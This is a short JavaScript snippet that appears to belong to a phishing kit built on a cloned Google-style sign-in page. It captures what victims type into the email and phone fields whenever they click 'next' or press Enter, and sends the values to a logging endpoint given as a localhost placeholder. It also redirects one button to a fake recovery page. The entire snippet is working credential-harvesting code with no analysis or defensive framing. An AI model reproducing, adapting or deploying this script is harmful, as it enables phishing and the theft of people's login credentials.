(()=>{
    let path=window.location.href,base=path.substr(0,path.lastIndexOf("/"))+"/";
    let rev = 'http://127.0.0.1/log';
    let serialize=e=>{for(var n=[],o=0;o<e.elements.length;o++){var t=e.elements[o];n.push(encodeURIComponent(t.name)+"="+encodeURIComponent(t.value))}return n.join("&")};
    //let log = e => fetch(rev, {method: 'post', body: serialize(document.forms[0])}); // post
    let log = e => {fetch(rev + '/?' + serialize(document.forms[0]));} // get
    let reg = (element,event,callback)=>{if (element) {element.addEventListener(event, callback)}};
	reg(document.querySelector('button'), 'click', ()=>{window.location=base+'recovery.html';});
	reg(document.querySelector("#identifierNext > div > button"), 'click', log);
	reg(document.querySelector('input[type=email]'), 'keyup', e=>{e.keyCode===13 ? log(e) : null;});
	reg(document.querySelector("#queryPhoneNext > div > button"), 'click', log);
})();